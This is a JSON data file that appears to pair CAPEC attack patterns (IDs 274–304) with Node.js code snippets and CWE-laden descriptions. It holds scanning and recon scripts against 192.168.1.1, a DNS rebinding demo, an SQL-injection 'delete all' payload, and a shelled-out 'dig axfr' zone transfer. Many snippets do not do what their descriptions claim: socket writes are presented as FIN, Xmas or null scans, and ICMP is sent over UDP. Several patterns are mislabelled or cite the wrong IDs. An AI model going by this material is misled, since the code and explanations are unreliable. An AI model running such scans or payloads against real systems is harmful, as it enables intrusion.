        "description": "This JavaScript code snippet creates an HTTP server using Node.js that is vulnerable to HTTP Response Smuggling. The server reads the request body and checks if it contains CRLF sequences (\\r\\n). If such sequences are found, it constructs a response that includes an additional HTTP response, demonstrating how an attacker could inject unauthorized responses. This vulnerability arises from improper neutralization of special elements (CWE-74), inconsistent interpretation of HTTP requests (CWE-444), and improper neutralization of CRLF sequences in HTTP headers (CWE-113). The code highlights the risk of an intermediary HTTP agent not correctly handling malformed HTTP requests or responses, leading to potential security issues."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  if (req.method === 'GET') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Access granted to GET request');\n  } else if (req.method === 'POST') {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access denied to POST request');\n  } else {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access denied');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://127.0.0.1:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server checks the HTTP verb of incoming requests and grants access only to GET requests, while denying access to POST requests and any other HTTP methods. This embodies the main idea of CAPEC-274 (HTTP Verb Tampering) by demonstrating how an attacker could potentially bypass access restrictions if the server's logic is solely based on the HTTP verb. The code also touches on CWE-654 (Reliance on a Single Factor in a Security Decision) by showing that the decision to grant access is based only on the HTTP verb, which is a single factor and can be easily manipulated by an attacker."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nconst server = http.createServer((req, res) => {\n  const targetHost = 'malicious.example.com';\n  dns.resolve4(targetHost, (err, addresses) => {\n    if (err) throw err;\n    const initialIP = addresses[0];\n    console.log(`Initial IP: ${initialIP}`);\n\n    // Simulate DNS Rebinding by changing the IP after initial contact\n    setTimeout(() => {\n      dns.resolve4(targetHost, (err, newAddresses) => {\n        if (err) throw err;\n        const rebindingIP = newAddresses[0];\n        console.log(`Rebinding IP: ${rebindingIP}`);\n\n        // Make a request to the rebinding IP\n        http.get(`http://${rebindingIP}`, (response) => {\n          let data = '';\n          response.on('data', (chunk) => { data += chunk; });\n          response.on('end', () => {\n            console.log(`Response from rebinding IP: ${data}`);\n            res.end(data);\n          });\n        }).on('error', (e) => {\n          console.error(`Got error: ${e.message}`);\n        });\n      });\n    }, 5000); // Change IP after 5 seconds\n  });\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server running at http://0.0.0.0:8080/');\n});",
        "description": "This JavaScript code snippet demonstrates a DNS Rebinding attack using Node.js. The server initially resolves the IP address of a malicious domain ('malicious.example.com'). After a delay, it resolves the domain again to simulate a DNS rebinding attack, changing the IP address to an internal network address. The server then makes an HTTP request to the new IP address, potentially accessing internal resources on behalf of the attacker. The code also binds the server to '0.0.0.0', making it accessible from any network interface, which is related to CWE-1327. This example highlights the vulnerability of relying on DNS resolution for security-critical actions (CWE-350) and the risks associated with open redirects (CWE-601)."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n    console.log('Connected');\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    client.write('AUTH username:password');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    if (data.toString() === 'AUTH_SUCCESS') {\n        console.log('Authentication successful');\n    } else {\n        console.log('Authentication failed');\n    }\n    client.destroy();\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a simple TCP client that connects to a server and sends authentication information in cleartext. This embodies the main idea of CAPEC-272 (Inter-component Protocol Manipulation) by showcasing vulnerabilities related to improper neutralization, cleartext transmission of sensitive information (CWE-319), and improper enforcement of message integrity during transmission (CWE-924). The code sends sensitive authentication data without encryption, making it susceptible to interception. Additionally, it does not verify the integrity of the received message, allowing potential manipulation by an attacker."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "const xml2js = require('xml2js');\nconst fs = require('fs');\n\n// Read XML data from a file\nfs.readFile('data.xml', 'utf8', (err, data) => {\n  if (err) throw err;\n\n  // Parse the XML data\n  xml2js.parseString(data, (err, result) => {\n    if (err) throw err;\n\n    // Assume the 'user' field is immutable and use it for authentication\n    const user = result.user;\n    if (user === 'admin') {\n      console.log('Authenticated as admin');\n    } else {\n      console.log('Authentication failed');\n    }\n  });\n});",
        "description": "This JavaScript code snippet reads and parses an XML file using the 'xml2js' library. It then extracts the 'user' field from the parsed XML data and uses it for authentication. The code assumes that the 'user' field is immutable and directly uses it to authenticate the user as 'admin'. This embodies the main idea of CAPEC-272 (Data Interchange Protocol Manipulation) by demonstrating how an attacker could manipulate the XML data to bypass authentication. The code also highlights related CWEs: CWE-707 (Improper Neutralization) by not validating the XML structure, CWE-302 (Authentication Bypass by Assumed-Immutable Data) by assuming the 'user' field is immutable, and CWE-201 (Insertion of Sensitive Information Into Sent Data) by potentially exposing sensitive authentication logic."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/api/data',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log('Response:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\n// Manipulating the request body to include unexpected values\nconst maliciousPayload = JSON.stringify({\n  userId: '1 OR 1=1', // SQL Injection\n  action: 'delete', // Unauthorized action\n  target: 'all' // Broad target\n});\n\nreq.write(maliciousPayload);\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a web service protocol manipulation attack. The code constructs an HTTP POST request to a web service endpoint '/api/data' on 'example.com'. The request body is manipulated to include unexpected values, such as an SQL injection payload ('1 OR 1=1') and an unauthorized action ('delete'). This can cause the web application to behave differently than intended, potentially granting unauthorized access or causing data deletion. The code embodies the CAPEC concept by showing how an adversary can manipulate call parameters to exploit vulnerabilities like improper neutralization (CWE-707) and client-side enforcement of server-side security (CWE-602)."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "const soapRequest = `\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservices\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:Login>\n         <username>admin</username>\n         <password>password</password>\n      </web:Login>\n   </soapenv:Body>\n</soapenv:Envelope>`;\n\nfetch('http://example.com/webservices', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'text/xml'\n  },\n  body: soapRequest\n})\n.then(response => response.text())\n.then(data => console.log(data))\n.catch(error => console.error('Error:', error));",
        "description": "This JavaScript code snippet demonstrates a SOAP request to a web service. The SOAP request contains a login operation with hardcoded credentials. This example embodies the main idea of SOAP Manipulation by showing how an attacker could manipulate SOAP parameters to send malicious requests. The code does not ensure that the SOAP message is well-formed or that security properties are met (CWE-707). It also relies on client-side enforcement of security (CWE-602) and does not restrict XML external entity references (CWE-611). Additionally, it demonstrates the potential for authentication bypass by capture-replay (CWE-294) and the use of client-side authentication (CWE-603)."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "const soap = require('soap');\nconst url = 'http://example.com/service?wsdl';\n\nsoap.createClient(url, function(err, client) {\n  if (err) throw err;\n  const params = { username: 'admin', password: 'password' };\n  client.SomeService.SomeMethod(params, function(err, result) {\n    if (err) throw err;\n    console.log(result);\n  });\n});\n\n// Attacker intercepts and modifies the SOAP request\nconst tamperedParams = { username: 'admin', password: 'wrongpassword' };\nclient.SomeService.SomeMethod(tamperedParams, function(err, result) {\n  if (err) throw err;\n  console.log(result);\n});",
        "description": "This JavaScript code snippet demonstrates a SOAP client making a request to a web service. The code first creates a SOAP client using a WSDL URL and then makes a request with specific parameters. The vulnerability is illustrated by an attacker intercepting and modifying the SOAP request parameters (e.g., changing the password). This represents the main idea of SOAP Parameter Tampering (CAPEC-279). The related CWEs provide context on potential weaknesses, such as exposure of sensitive information in the WSDL file (CWE-651) and authentication bypass issues (CWE-294)."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from([0x08, 0x00, 0x4d, 0x3b, 0x00, 0x01, 0x00, 0x01]); // ICMP Echo Request\nconst targetHost = '192.168.1.1';\nconst targetPort = 7; // Echo Protocol\n\nclient.send(message, targetPort, targetHost, (err) => {\n  if (err) {\n    console.error('Error sending message:', err);\n  } else {\n    console.log('Ping message sent');\n  }\n  client.close();\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received response from ${rinfo.address}: ${msg.toString('hex')}`);\n});",
        "description": "This JavaScript code snippet demonstrates how to send an ICMP Echo Request (Ping) to a target host using UDP sockets. The code creates a UDP socket, constructs an ICMP Echo Request message, and sends it to the target host. If the target host is responsive and not protected by a firewall or ACL, it will reply with an ICMP Echo Reply. The code listens for incoming messages and logs the response. This snippet embodies the main idea of the CAPEC by showing how an adversary can determine if a target system is responsive. The related CWEs provide context on potential vulnerabilities, such as exposure of sensitive information (CWE-200) and cleartext transmission (CWE-319), which can be exploited during this process."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "const net = require('net');\n\nconst targetHost = '192.168.1.1';\nconst targetPorts = [22, 80, 443, 8080];\n\nfunction synScan(host, ports) {\n  ports.forEach(port => {\n    const socket = new net.Socket();\n    socket.setTimeout(2000);\n    socket.on('connect', () => {\n      console.log(`Port ${port} is open on ${host}`);\n      socket.destroy();\n    });\n    socket.on('timeout', () => {\n      console.log(`Port ${port} is filtered or closed on ${host}`);\n      socket.destroy();\n    });\n    socket.on('error', (err) => {\n      console.log(`Port ${port} is closed on ${host}`);\n    });\n    socket.connect(port, host);\n  });\n}\n\nsynScan(targetHost, targetPorts);",
        "description": "This JavaScript code snippet performs a basic TCP SYN scan on a target host to determine the status of specified ports. The 'net' module is used to create a socket connection to each port. If the connection is successful, the port is open; if it times out or encounters an error, the port is closed or filtered. This embodies the main idea of the CAPEC by demonstrating a SYN scan to identify open ports on a target system. The code also indirectly highlights related CWEs: it could expose sensitive information (CWE-200), potentially bind to the same port multiple times (CWE-605), and increase the attack surface (CWE-1125)."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "const http = require('http');\nconst crypto = require('crypto');\n\nconst server = http.createServer((req, res) => {\n  if (req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const { username, password } = JSON.parse(body);\n      const token = crypto.createHash('sha256').update(username + password).digest('hex');\n      res.end(token);\n    });\n  } else {\n    res.statusCode = 405;\n    res.end();\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that listens for POST requests. When a POST request is received, it reads the request body, which is expected to contain a JSON object with 'username' and 'password' fields. It then generates a token by hashing the concatenated username and password using SHA-256 and returns this token as the response.\n\nThe code embodies the main idea of the deprecated CAPEC-285 (ICMP Echo Request Ping) by demonstrating a potential vulnerability related to authentication bypass (CWE-294). Specifically, the use of a simple hash for generating tokens can be exploited by an attacker who captures and replays the same request, thereby bypassing authentication. Additionally, the code does not handle state synchronization or race conditions (related to CWE-373), and it relies on a non-ubiquitous API (crypto module) which may not be available in all environments (CWE-589)."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Middleware to simulate non-transparent sharing of resources\napp.use((req, res, next) => {\n  // Simulate a shared cache that can be exploited\n  global.sharedCache = global.sharedCache || {};\n  const user = req.query.user;\n  if (user) {\n    global.sharedCache[user] = global.sharedCache[user] || [];\n    global.sharedCache[user].push(req.url);\n  }\n  next();\n});\n\n// Route that simulates access to protected and unprotected resources\napp.get('/resource', (req, res) => {\n  const address = req.query.address;\n  if (address >= 1000 && address <= 2000) {\n    res.send('Access to protected resource');\n  } else if (address >= 2001 && address <= 3000) {\n    res.send('Access to unprotected resource');\n  } else if (address >= 1500 && address <= 2500) {\n    res.send('Access to overlapping region');\n  } else {\n    res.send('Invalid address');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a web server that demonstrates vulnerabilities related to the deprecated CAPEC pattern and associated CWEs. The middleware simulates non-transparent sharing of resources by using a global shared cache, which can be exploited by attackers to infer information about other users' requests. The '/resource' route simulates access to protected and unprotected memory regions, with an overlapping region that allows bypassing access control, representing the 'Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges' CWE. This code highlights how improper resource management and overlapping address spaces can lead to security vulnerabilities."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "const dns = require('dns');\n\nfunction enumerateMXRecords(domain) {\n  dns.resolveMx(domain, (err, addresses) => {\n    if (err) {\n      console.error('Error resolving MX records:', err);\n      return;\n    }\n    addresses.forEach(record => {\n      console.log(`MX Record: ${record.exchange} with priority ${record.priority}`);\n      dns.reverse(record.exchange, (err, hostnames) => {\n        if (err) {\n          console.error('Reverse DNS lookup failed:', err);\n        } else {\n          console.log(`Hostnames for ${record.exchange}: ${hostnames}`);\n        }\n      });\n    });\n  });\n}\n\nenumerateMXRecords('example.com');",
        "description": "This JavaScript code snippet demonstrates how to enumerate MX records for a given domain using Node.js's 'dns' module. The function 'enumerateMXRecords' takes a domain name as input and performs a DNS query to retrieve the MX records. For each MX record, it logs the mail exchange server and its priority. Additionally, it performs a reverse DNS lookup on each mail exchange server to obtain associated hostnames. This process can potentially expose sensitive information about the network's internal structure, such as the IP addresses of firewalls or internal systems, aligning with CAPEC-Enumerate Mail Exchange (MX) Records. The code also touches on related CWEs by exposing sensitive information (CWE-200), relying on reverse DNS resolution (CWE-350), and potentially omitting security-relevant information (CWE-223)."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "const dns = require('dns');\n\nfunction performZoneTransfer(domain) {\n  dns.resolveNs(domain, (err, nameservers) => {\n    if (err) throw err;\n    nameservers.forEach(ns => {\n      const dig = require('child_process').exec;\n      dig(`dig axfr ${domain} @${ns}`, (error, stdout, stderr) => {\n        if (error) {\n          console.error(`Error: ${stderr}`);\n          return;\n        }\n        console.log(`Zone Transfer Data from ${ns}:\n${stdout}`);\n      });\n    });\n  });\n}\n\nperformZoneTransfer('example.com');",
        "description": "This JavaScript code snippet demonstrates a DNS Zone Transfer attack. It uses the 'dns' module to resolve the nameservers for a given domain and then attempts to perform a zone transfer using the 'dig' command. The 'dig axfr' command is used to request the entire zone file from each nameserver. If the nameserver is misconfigured to allow zone transfers, it will return sensitive information about the domain's DNS records. This can expose internal network topology, server roles, and potentially operating system information. The code embodies the main idea of CAPEC-200: DNS Zone Transfers, and highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by showing how sensitive information can be exposed through misconfigured DNS servers."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
        "code_snippet": "const net = require('net');\nconst dns = require('dns');\n\nconst ipRange = ['192.168.1.1', '192.168.1.2', '192.168.1.3'];\n\nipRange.forEach(ip => {\n  const client = new net.Socket();\n  client.setTimeout(1000);\n\n  client.connect(80, ip, () => {\n    console.log(`Host ${ip} is alive`);\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.log(`Host ${ip} is not responding`);\n  });\n\n  client.on('timeout', () => {\n    console.log(`Host ${ip} timed out`);\n    client.destroy();\n  });\n\n  dns.reverse(ip, (err, hostnames) => {\n    if (err) {\n      console.log(`Reverse DNS lookup failed for ${ip}`);\n    } else {\n      console.log(`Reverse DNS for ${ip}: ${hostnames}`);\n    }\n  });\n});",
        "description": "This JavaScript code snippet performs a basic host discovery by attempting to connect to a range of IP addresses on port 80. If a connection is successful, it logs that the host is alive. It also performs a reverse DNS lookup for each IP address to obtain the hostname. This code embodies the main idea of CAPEC-309 (Host Discovery) by probing IP addresses to determine if hosts are alive. It also touches on related CWEs: CWE-291 (Reliance on IP Address for Authentication) by using IP addresses to identify hosts, CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action) by performing reverse DNS lookups, and CWE-319 (Cleartext Transmission of Sensitive Information) as the connection attempts are made in cleartext."
    },
    {
        "capec_id": "293",
        "capec_name": "Traceroute Route Enumeration",
        "code_snippet": "const net = require('net');\n\nfunction traceroute(target) {\n  let ttl = 1;\n  const maxHops = 30;\n\n  function sendPacket() {\n    const socket = new net.Socket();\n    socket.setTimeout(5000);\n    socket.on('error', () => {});\n    socket.on('timeout', () => {});\n    socket.connect({ host: target, port: 80, localAddress: '0.0.0.0', localPort: 0, family: 4, hints: 0, lookup: undefined }, () => {\n      socket.setTTL(ttl);\n      socket.write('GET / HTTP/1.1\\r\\nHost: ' + target + '\\r\\n\\r\\n');\n    });\n    socket.on('data', (data) => {\n      console.log(`Hop ${ttl}: ${socket.remoteAddress}`);\n      socket.destroy();\n      if (ttl < maxHops) {\n        ttl++;\n        sendPacket();\n      }\n    });\n  }\n\n  sendPacket();\n}\n\ntraceroute('example.com');",
        "description": "This JavaScript code snippet demonstrates a basic implementation of a traceroute utility using TCP packets. The function `traceroute` sends packets to a target server, incrementing the Time-to-Live (TTL) field with each hop. When the TTL expires, an ICMP diagnostic message is generated, revealing the IP address of the hop. This process continues until the maximum number of hops is reached or the target is reached. The code embodies the main idea of CAPEC-292 (Traceroute Route Enumeration) by mapping out the route data flows through the network. The related CWEs are represented by the potential exposure of sensitive information (e.g., IP addresses of intermediate hops) to unauthorized actors, as the traceroute process inherently reveals network topology information."
    },
    {
        "capec_id": "294",
        "capec_name": "ICMP Address Mask Request",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  if (msg[0] === 17) { // ICMP Type 17 Address Mask Request\n    const response = Buffer.from([18, ...getAddressMaskReply()]); // ICMP Type 18 Address Mask Reply\n    server.send(response, 0, response.length, rinfo.port, rinfo.address, (err) => {\n      if (err) console.error('Error sending response:', err);\n    });\n  }\n});\n\nserver.bind(0, '0.0.0.0'); // CWE-1327: Binding to an Unrestricted IP Address\n\nfunction getAddressMaskReply() {\n  // Simulate sensitive information exposure (CWE-200)\n  return [255, 255, 255, 0]; // Example subnet mask\n}\n",
        "description": "This JavaScript code snippet creates a UDP server that listens for ICMP messages. When it receives an ICMP Type 17 Address Mask Request, it responds with an ICMP Type 18 Address Mask Reply containing a subnet mask. The server binds to the unrestricted IP address 0.0.0.0, which is a security weakness (CWE-1327). The response includes sensitive network configuration information (CWE-200), which can be exploited by an unauthorized actor. This code demonstrates how an adversary could gather network information using ICMP Address Mask Requests, aligning with the CAPEC description."
    },
    {
        "capec_id": "295",
        "capec_name": "Timestamp Request",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.method === 'GET' && req.url.includes('/timestamp')) {\n    const timestamp = new Date().toISOString();\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Timestamp: ${timestamp}`);\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server listens for GET requests at the '/timestamp' endpoint and responds with the current timestamp in ISO format. This demonstrates the 'Timestamp Request' attack pattern (CAPEC) by exposing the server's current time. The code also touches on related CWEs: it exposes sensitive information (CWE-200), uses the GET method with sensitive data in the query string (CWE-598), and could potentially be exploited for timing attacks (CWE-208, CWE-385). An attacker could use the timestamp to infer information about the server's time-based security mechanisms or to replay requests (CWE-294)."
    },
    {
        "capec_id": "296",
        "capec_name": "ICMP Information Request",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  if (msg.toString() === 'ICMP_INFO_REQUEST') {\n    const response = Buffer.from('ICMP_INFO_RESPONSE');\n    server.send(response, 0, response.length, rinfo.port, rinfo.address, (err) => {\n      if (err) console.error('Error sending response:', err);\n    });\n  }\n});\n\nserver.bind(12345, () => {\n  console.log('Server listening on port 12345');\n});",
        "description": "This JavaScript code snippet creates a UDP server that listens for incoming messages. When it receives a message with the content 'ICMP_INFO_REQUEST', it responds with 'ICMP_INFO_RESPONSE'. This simulates the behavior of an ICMP Information Request and Response, which is a deprecated mechanism. The code demonstrates the potential exposure of sensitive information (CWE-200, CWE-497) and the transmission of data in cleartext (CWE-319). The use of a simple string comparison and response mechanism highlights the lack of robust security measures, which could be exploited by an adversary to gather information about the host."
    },
    {
        "capec_id": "297",
        "capec_name": "TCP ACK Ping",
        "code_snippet": "const net = require('net');\n\nfunction sendTcpAckPing(host, port) {\n  const client = new net.Socket();\n  client.connect(port, host, () => {\n    const ackPacket = Buffer.from([0x10]); // ACK flag set\n    client.write(ackPacket);\n  });\n\n  client.on('data', (data) => {\n    if (data.includes(Buffer.from([0x14]))) { // RST flag set\n      console.log('Host is alive');\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error('Error:', err.message);\n    client.destroy();\n  });\n}\n\nsendTcpAckPing('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP ACK Ping to determine if a remote host is alive. The code uses the 'net' module to create a TCP socket and connect to a specified host and port. It sends a TCP segment with the ACK flag set. If the host is alive, it will respond with a RST packet, which the code detects and logs a message indicating the host is alive. This embodies the CAPEC concept of using TCP ACK Pings to check for live hosts. The code also touches on CWE-319 by not encrypting the communication, potentially exposing sensitive information, and CWE-200 by revealing the host's status to an unauthorized actor."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('');\nconst targetHost = '192.168.1.1'; // Target IP address\nconst targetPort = 65535; // High port number\n\nclient.send(message, 0, message.length, targetPort, targetHost, (err) => {\n  if (err) {\n    console.error('Error sending UDP packet:', err);\n  } else {\n    console.log('UDP packet sent');\n  }\n  client.close();\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received message: ${msg} from ${rinfo.address}:${rinfo.port}`);\n});",
        "description": "This JavaScript code snippet demonstrates a UDP ping to a high port (65535) on a target host (192.168.1.1). The code uses Node.js's 'dgram' module to create a UDP socket and send an empty UDP datagram to the specified target. The goal is to elicit an 'ICMP port unreachable' message from the target, indicating that the host is alive. This approach leverages the CAPEC concept of using UDP pings to detect live hosts. The code also listens for any incoming messages, which could include the ICMP error message. This snippet embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially revealing the host's status, and CWE-941 (Incorrectly Specified Destination in a Communication Channel) by targeting a high, likely unused port. Additionally, it touches on CWE-1320 (Improper Protection for Outbound Error Messages and Alert Signals) by not securing the error messages that might be received."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "const net = require('net');\n\nfunction tcpSynPing(target, port) {\n  const client = new net.Socket();\n  client.setTimeout(5000);\n\n  client.connect(port, target, () => {\n    console.log('TCP SYN packet sent');\n  });\n\n  client.on('data', (data) => {\n    console.log('Received:', data.toString());\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    if (err.code === 'ECONNREFUSED') {\n      console.log('Port is closed (RST received)');\n    } else {\n      console.error('Error:', err.message);\n    }\n    client.destroy();\n  });\n\n  client.on('timeout', () => {\n    console.log('No response (timeout)');\n    client.destroy();\n  });\n}\n\ntcpSynPing('192.168.1.1', 80);",
        "description": "This JavaScript code snippet uses the 'net' module to perform a TCP SYN ping to a specified target and port. The function 'tcpSynPing' attempts to establish a connection to the target. If the port is open, the target will respond with a SYN/ACK packet, and the 'data' event will be triggered, indicating that the port is open. If the port is closed, an 'ECONNREFUSED' error will be caught, indicating that a RST packet was received. If there is no response within the timeout period, it logs a timeout message. This code demonstrates the concept of using TCP SYN packets for host discovery, as described in the CAPEC. Additionally, it touches on CWE-200 (Exposure of Sensitive Information) by potentially revealing the status of ports, and CWE-319 (Cleartext Transmission of Sensitive Information) by transmitting data in cleartext."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "const net = require('net');\nconst sensitiveData = 'password123';\n\nconst server = net.createServer((socket) => {\n  socket.write('Welcome to the server!\\n');\n  socket.on('data', (data) => {\n    console.log('Received:', data.toString());\n    if (data.toString().trim() === 'GET /sensitive') {\n      socket.write(`Sensitive Data: ${sensitiveData}\\n`);\n    }\n  });\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server listening on port 8080');\n});\n\n// Allow multiple binds to the same port\nserver.on('error', (err) => {\n  if (err.code === 'EADDRINUSE') {\n    console.error('Port 8080 is already in use');\n  }\n});",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens on port 8080 and responds to incoming connections. When a client sends the message 'GET /sensitive', the server responds with sensitive data ('password123') in cleartext. The server also allows multiple binds to the same port, which can lead to port hijacking or spoofing. This code demonstrates vulnerabilities related to CAPEC-300 (Port Scanning) and related CWEs: CWE-200 (Exposure of Sensitive Information), CWE-605 (Multiple Binds to the Same Port), and CWE-319 (Cleartext Transmission of Sensitive Information)."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "const net = require('net');\n\nconst targetIP = '192.168.1.1';\nconst targetPort = 80;\n\nconst client = new net.Socket();\nclient.connect(targetPort, targetIP, () => {\n  console.log('Connected to ' + targetIP + ':' + targetPort);\n  client.end();\n});\n\nclient.on('error', (err) => {\n  console.log('Port ' + targetPort + ' is closed or unreachable.');\n});",
        "description": "This JavaScript code snippet demonstrates a basic TCP connect scan, which attempts to establish a full TCP connection to a specified IP address and port. The code uses Node.js's 'net' module to create a socket and attempt a connection to the target IP and port. If the connection is successful, it logs a message indicating the port is open. If an error occurs, it logs that the port is closed or unreachable. This embodies the main idea of the CAPEC by performing a TCP connect scan to determine the status of a port. The code also indirectly touches on related CWEs: it could expose sensitive information (CWE-200) if the target system logs connection attempts, and it relies on IP address for targeting (CWE-291)."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpFinScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    const finPacket = Buffer.from([0x01]); // Simplified FIN packet\n    client.write(finPacket);\n  });\n\n  client.on('data', (data) => {\n    if (data.includes('RST')) {\n      console.log(`Port ${port} is closed on ${target}`);\n    } else {\n      console.log(`Port ${port} is open or filtered on ${target}`);\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n    client.destroy();\n  });\n}\n\ntcpFinScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a simplified TCP FIN scan to determine if a port is closed on a target machine. The `tcpFinScan` function connects to a specified target and port, sends a simplified FIN packet, and listens for a response. If a 'RST' (Reset) packet is received, it indicates that the port is closed. Otherwise, the port is considered open or filtered. This code embodies the main idea of CAPEC-303 (TCP FIN Scan) by using out-of-state TCP segments to identify closed ports. The related CWEs provide additional context, such as the potential exposure of sensitive information (CWE-200) and improper restriction of communication channels (CWE-923)."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "const net = require('net');\n\nfunction sendXmasScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    const xmasPacket = Buffer.from([0xFF, 0xFF, 0xFF, 0xFF]); // All flags set\n    client.write(xmasPacket);\n  });\n\n  client.on('data', (data) => {\n    if (data.includes('RST')) {\n      console.log(`Port ${port} is closed on ${target}`);\n    } else {\n      console.log(`Port ${port} is open or filtered on ${target}`);\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n    client.destroy();\n  });\n}\n\nsendXmasScan('192.168.1.1', 80);",
        "description": "This JavaScript code snippet demonstrates a TCP Xmas scan, which is used to determine if ports are closed on a target machine. The code uses the 'net' module to create a TCP connection to a specified target and port. It sends a packet with all TCP flags set (Xmas packet) to the target. If the target responds with a RST (reset) packet, it indicates that the port is closed. Otherwise, the port is considered open or filtered. This scan technique leverages the behavior described in RFC 793, where out-of-state flags sent to closed ports should elicit a RST response. The code also highlights potential weaknesses such as exposure of sensitive information (CWE-200), lack of integrity checks (CWE-353), and improper restriction of communication channels (CWE-923)."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "const net = require('net');\n\nfunction tcpNullScan(target, port) {\n  const client = new net.Socket();\n  client.connect(port, target, () => {\n    const nullPacket = Buffer.alloc(0); // Create an empty buffer to simulate a TCP NULL packet\n    client.write(nullPacket);\n  });\n\n  client.on('data', (data) => {\n    if (data.toString().includes('RST')) {\n      console.log(`Port ${port} is closed on ${target}`);\n    }\n    client.destroy();\n  });\n\n  client.on('error', (err) => {\n    console.error(`Error: ${err.message}`);\n    client.destroy();\n  });\n}\n\ntcpNullScan('192.168.1.1', 80);",
